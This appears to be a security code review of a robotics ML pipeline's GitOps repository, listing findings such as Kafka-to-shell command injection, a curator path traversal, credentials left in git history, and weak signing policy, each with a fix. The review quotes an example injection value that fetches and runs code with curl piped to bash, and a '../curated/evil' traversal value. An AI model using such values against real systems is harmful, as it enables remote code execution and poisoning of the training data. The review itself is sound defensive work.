### Critical

- **[gitops/flywheel/edge-kafka.yaml:118 → src/host-runner/host_runner.py:121]** -- Remote command execution on the desktop GPU host from an unauthenticated network port. `edge-kafka-external` is a NodePort (30903) on a `PLAINTEXT` listener with no SASL/TLS and no ACLs, advertised at `10.0.0.49:30903` (edge-kafka.yaml:20) and reachable from the LAN/Tailscale. Anything that can reach it may produce to `training-triggers`. `host_runner.handle()` takes `t["candidate"]` straight off that topic (host_runner.py:205) and f-string-interpolates it into a bash snippet run via `docker run --network host --gpus all ... bash -lc` (host_runner.py:121-125, 93-95, 86). A trigger with `candidate: "x; curl … | bash; #"` executes attacker code in a container with host networking, the GPU, `$HOME/.cache/huggingface` and the flywheel data dir mounted, launched by a user in the `docker` group (root-equivalent on the host). This is the same "raw unauthenticated port" shape as D114, but here the path is a real NodePort on the wire, not `oc port-forward`, so the RBAC argument that bounded D114 does not apply.
  **Fix:** Two independent changes. (1) Delete the `edge-kafka-external` NodePort Service, or move Olga's dashboard onto a SASL_SSL listener with a scoped user — a plaintext broker with no ACLs should not have a node-level port. (2) Stop building shell strings from message fields: validate `candidate`/`incumbent`/`collector` against `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$` at the top of `handle()` and reject non-matching triggers, and pass the lerobot/assembler arguments as an argv list to `docker run` rather than through `bash -lc`.

- **[gitops/flywheel/curator.yaml:110 and :122,:228]** -- Unauthenticated episode injection plus path traversal, bypassing the curation gate. The receiver binds `0.0.0.0:8082` (curator.yaml:122) and is published as NodePort 30802 (curator.yaml:228) with no authentication, no origin check and no body-size limit. `out = RAW_DIR / f"{eid}.json"` uses an entirely attacker-controlled `episode_id` (curator.yaml:110); `episode_id = "../curated/evil"` writes directly into `/data/episodes/curated/`, skipping `score_episode()` altogether — and `curated/` is exactly what `sync-agent` uploads to MinIO and announces on Kafka (sync-agent.yaml:50-75), which is what the training set is assembled from. A plain POST with `task_success: true` also passes every gate legitimately. The file's own header claims "the governed pipeline ensures data never leaves the device without passing curation" (curator.yaml:14-15); that property does not hold. The pod also has hostPath `/var/lib/episodes` mounted (curator.yaml:212-213) and inherits the namespace `default` SA, which holds the privileged SCC (see the scc-rolebinding finding).
  **Fix:** Reject any `episode_id` not matching `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` before building the path, and assert `out.resolve().parent == RAW_DIR.resolve()` after. Cap `Content-Length` (reject > ~1 MB). Drop the NodePort and require a shared token header (or mTLS) from the emitter — the emitter already knows a fixed URL, so a bearer secret is a one-line change on both sides.

- **[argocd/README.md:53-54 + rhem/bootstrap/repository.yaml:6]** -- MinIO root credentials are recoverable from git history of a repository the project itself treats as publicly clonable, and remain live. `gitops/flywheel/hub-credentials.yaml` carried `s3-access-key`/`s3-secret-key` in plaintext `stringData` from commit `18c7613` until `85e9176` (2026-09-09); `git show 18c7613:gitops/flywheel/hub-credentials.yaml` still returns them. README:54 records that `hub-credentials` holds the *same values* as the MinIO root account, and `minio-external` publishes the S3 API on NodePort 30900 (gitops/minio/minio.yaml:127-134). D078 knowingly deferred rotation, but reasons only about the live Secrets and the working tree ("`grep -rn minioadmin` returns exactly two hits, both prose") — it does not account for history, and the flightctl `Repository` is declared with no auth secret and commented "public, no auth" (repository.yaml:6), which means the ResourceSync clones it anonymously and anyone can read that history. Root credentials give read/write on `episodes-curated`, `episodes-rejected` and `checkpoints/`, i.e. write access to the training inputs and to the incumbent checkpoint the next fine-tune starts from.
  **Fix:** Rotate now rather than at the Fury rebuild (D078's "Proposed follow-up"), and treat the historical values as burned. If the GitHub repo is genuinely public, either make it private or rewrite history for that path; if it is private, say so explicitly in D078 and in `repository.yaml:6`, because the current comment asserts the opposite and is what a reader will act on. Amend D078 with the history/public-repo consideration so the accepted risk matches reality.

### Warning

- **[pipeline/act_flywheel_pipeline.py:151 and :117]** -- The KFP signing and packaging steps download `cosign` and `crane` from GitHub over the network and execute them with no integrity check: `urllib.request.urlretrieve(...cosign-linux-{arch}, "/tmp/cosign"); os.chmod(0o755)` (line 151-152) and the same pattern for crane (line 116-117). The Tekton `cosign-sign` Task does this correctly — it pins `COSIGN_SHA256_AMD64`/`ARM64` and runs `sha256sum -c` before `chmod +x` (cosign-sign-task.yaml:47-52, 112-115). The unverified path is the one that holds the signing key (`/etc/cosign/cosign.key`) and the quay push credentials, which is the worst place in the system to run an unverified binary.
  **Fix:** Lift the checksum block from `cosign-sign-task.yaml` into `sign_modelcar` and `package_modelcar`: pin the release digests as pipeline parameters next to `cosign_version`/`crane_version` and `hashlib.sha256` the download before `os.chmod`, aborting on mismatch.

- **[pipeline/act_flywheel_pipeline.py:161-167]** -- The modelcar signing step signs but never verifies, and a missing transparency-log entry does not stop the promotion. `sign_modelcar` runs `cosign sign … --tlog-upload=true`, scrapes `tlog entry created with index: N` from stdout, and returns `idx[0] if idx else -1` (line 167) — an empty list is not an error. If Rekor is unreachable or the upload silently no-ops, the component still succeeds, `register_model` records `rekor_index: -1` as provenance (line 189), and `open_promotion_pr` opens a PR whose body asserts "each device pulls the modelcar under its policy.json (cosign key + Rekor SET)" (line 319-320) for an image that may have no SET. The device fails closed at pull time (good), but the failure surfaces as a stalled rollout at demo time rather than a failed pipeline. The Tekton runtime-image path does this right (cosign-sign-task.yaml:153, 157-192: a mandatory verify step with `SIGSTORE_REKOR_PUBLIC_KEY`, and an explicit `no Rekor entry reported` hard failure).
  **Fix:** Fail the component when `idx` is empty, and add the Tekton verify step to `sign_modelcar` — `cosign verify --key /etc/cosign/cosign.pub --rekor-url <url>` with `SIGSTORE_REKOR_PUBLIC_KEY` pointed at the same `rekor.pub` the Fleet ships, asserting on exit code, before `register_model` and `open_promotion_pr` run.

- **[gitops/flywheel/manifest-consumer.yaml:22 and :32]** -- The consumer disables TLS verification entirely (`ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE`) on both calls to `https://ds-pipeline-dspa.flywheel.svc:8443`, while sending its ServiceAccount bearer token in the `Authorization` header (lines 24, 31). That SA holds the `edit` ClusterRole in `flywheel` (pipeline-rbac.yaml:19-22), so anything that can answer on that name/port harvests a namespace-edit token. The correct pattern already exists in this repo: `register_model` passes `custom_ca="/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt"` (act_flywheel_pipeline.py:184).
  **Fix:** Build the context with `ssl.create_default_context(cafile="/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt")` and drop the two `CERT_NONE` lines — the DSP route is served by the OpenShift service CA, which the pod already mounts. Same change applies to `sync-agent.yaml:46-47` (`ssl_check_hostname=False` + `ssl._create_unverified_context()`), which has no token but is the same anti-pattern.

- **[gitops/rhem/fleet-act-inference.yaml:91-95 and :117-119,:127-129]** -- The device trust policy is repo-scoped and fails *open*, not closed. `"default": [{"type": "insecureAcceptAnything"}]` (lines 91-95) means signature enforcement applies only to the four `transports.docker` keys listed. Any image reference outside `quay.io/jary/soarm-act-modelcar` and `quay.io/jary/soarm-flywheel` — a renamed repo, a `-test`/`-staging` suffix, a mirror, a typo in a promotion edit — is pulled unsigned with no error. Because `open_promotion_pr` rewrites the digest with a regex anchored on the literal `soarm-act-modelcar` (act_flywheel_pipeline.py:245), a repo rename is exactly the kind of edit that would land here by hand. Additionally `signedIdentity: {"type": "matchRepository"}` (lines 117-119, 127-129) accepts any tag in the repo carrying a valid signature, so a signature made for a different artifact in the same repo satisfies the policy for this one. D091's negative tests prove enforcement works *for the two named repos*; they do not exercise the default branch.
  **Fix:** Set `"default": [{"type": "reject"}]` and enumerate every registry the device is allowed to pull from (the RHEL entries are already explicit, so the only additions are the two quay repos). Then add a third standing negative test alongside D091's two: the same signed image pushed to a repo not in `policy.json`, which must also be rejected — today it would be accepted.

- **[gitops/flywheel/scc-rolebinding.yaml:3-13]** -- A `ClusterRoleBinding` grants `system:openshift:scc:privileged` to the `default` ServiceAccount in `flywheel`. Every pod in that namespace that does not name its own SA runs as `default` — that is `curator`, `sync-agent`, `rejected-mirror` and `so-arm-sim`, none of which need it; only `edge-kafka` actually requests `privileged: true` (edge-kafka.yaml:55). So the unauthenticated-input workloads above sit on a SA that can request host namespaces, host paths and full capabilities. It is also a `ClusterRoleBinding` where a namespaced `RoleBinding` would do — contrast `pipeline-sa-scc.yaml:8-20` and `qemu-binfmt.yaml:19-31`, both of which correctly scope to the namespace and to a dedicated SA.
  **Fix:** Give `edge-kafka` its own ServiceAccount, bind privileged to that SA with a namespaced `RoleBinding` (matching the `pipeline-sa-scc.yaml` pattern), and delete the `default`-SA grant. The dashboard's `hostmount-anyuid` binding below it is already correctly scoped to a named SA — mirror it.

### Suggestion

- **[gitops/rhem-catalog/catalogitem-soarm-act.yaml:44-49 vs gitops/rhem/fleet-act-inference.yaml:201]** -- The provenance record and the deployed state disagree. The CatalogItem's head version is `2.0.0-ft160-rhem` (`sha256:18cc4412…`, `replaces: 2.0.0-ft160`), while the Fleet pins `sha256:bdb513ca…` = `2.0.0-ft160` and `MODEL_VERSION: act-v2-ft160` (fleet lines 189, 201). The `-rhem` promotion was rolled back in `ff39942`, but the CatalogItem was hand-written afterwards in `0c2dbbf` and still presents the rolled-back candidate as current — violating the invariant stated in its own header ("The Fleet's pin and the newest version here must agree", lines 13-14). A GitOps rollback of a *future* promotion would revert both files together since the pipeline writes them in one commit (act_flywheel_pipeline.py:256-294); this drift is specific to the hand-authored seed. Worth reconciling before the booth, since the catalog is the artifact a visitor is shown as the audit trail.

- **[docker/Dockerfile:13,35,51 and docker/Dockerfile.gpu-inference:17,40,42]** -- The signed runtime image is built from unpinned inputs, so the signature attests to bits that change between rebuilds: `FROM ros:${DISTRO}` / `FROM docker.io/library/ros:${DISTRO}` are floating tags with no digest; `git clone --depth 1 https://github.com/ros-physical-ai/demos` takes whatever `main` is at build time; `vcs import src < src/demos/pai.repos --recursive` pulls a transitive tree from that; and `pip install opencv-python-headless flask numpy` (Dockerfile:51-55) has no version bounds. The Tekton pipeline digest-pins its own step images correctly (buildah-cross-arch-task.yaml:118, cosign-sign-task.yaml:73, qemu-binfmt.yaml:62,73) — the same discipline has not reached the image being built. The runtime `pip install` lines in `sync-agent.yaml:111`, `rejected-mirror.yaml:78` and `manifest-consumer.yaml:72` are the same issue at pod start, in pods holding MinIO credentials. Also worth noting for the D114-analogue sweep: `model-registry.yaml:107-108` declares both `rest: {}`/`grpc: {}` and an `oauthProxy`, the same authenticated-plus-raw-port shape — the raw ports are covered by the operator's ingress NetworkPolicy but, exactly as in D114, not against `oc port-forward`; here the exposure would be write access to the promotion audit record.

### Positive

- **[gitops/tekton/cosign-sign-task.yaml:112-117]** -- The cosign binary is fetched arch-derived and checked against a pinned SHA-256 before it is made executable, with the release checksums documented. This is the correct pattern and it is worth propagating to the KFP components.
- **[gitops/tekton/cosign-sign-task.yaml:157-192]** -- The verify step is genuinely non-bypassable: no `--insecure-ignore-tlog` anywhere, `SIGSTORE_REKOR_PUBLIC_KEY` pinned to the same `rekor.pub` bytes the Fleet ships to devices, pass/fail asserted on exit code with an explicit comment on why the message text is unreliable (line 173-175), and a hard failure if the verified payload carries no `logIndex` (line 190). Verification is done the way the device will do it, against the same key material.
- **[gitops/rhem/fleet-act-inference.yaml:112-131 and :151-164]** -- Both quay entries carry `keyPath` *and* `rekorPublicKeyPath`, so the device enforces the Rekor SET and not merely the signature — the harder and more meaningful half. The RHEL default `registry.access.redhat.com`/`registry.redhat.io` entries are deliberately preserved because the inline file replaces the distro's (lines 32-35), which is the kind of detail that is usually lost when a `policy.json` is templated.
- **[DECISIONS.md D091]** -- Standing negative-trust artifacts with verbatim device-side failure strings for both the unsigned case and the signed-but-not-logged case, plus the reasoning for why a retagged digest would not have been a valid test. Proving what the device *rejects*, and keeping the artifact around as a permanent fixture, is the part most projects skip.
- **[tools/hub/create-model-registry-db-secret.sh:9-15]** -- Password generated locally, never printed, idempotent, with `FORCE=1` as the explicit override and a note that the DB volume keeps the old value. Correct handling for a hand-created Secret.
- **[pipeline/act_flywheel_pipeline.py:110-114 and :91-95]** -- Tar members are rewritten through `os.path.basename` before extraction, which closes the usual CVE-2007-4559 traversal in modelcar packaging; and `eval_gate` is a hard `sys.exit(1)` stop so nothing downstream (package, sign, PR) can run on a candidate that failed the statistical gate.

---
**Verdict:** REQUEST_CHANGES
**Summary:** The signing and transparency-log chain itself is well built and genuinely enforced end-to-end — checksum-pinned cosign, a verify step with no tlog bypass, `rekorPublicKeyPath` on the device, and standing negative tests that prove rejection — but the chain is bracketed by unauthenticated inputs at both ends: a plaintext Kafka NodePort whose messages reach a shell interpolation on the GPU host, and an unauthenticated curator endpoint with a path traversal that writes straight past the curation gate into the training set. Fixing those two, rotating the MinIO credentials that remain readable in git history, and closing the `policy.json` default from `insecureAcceptAnything` to `reject` would leave the trust story as strong as the demo claims it is.
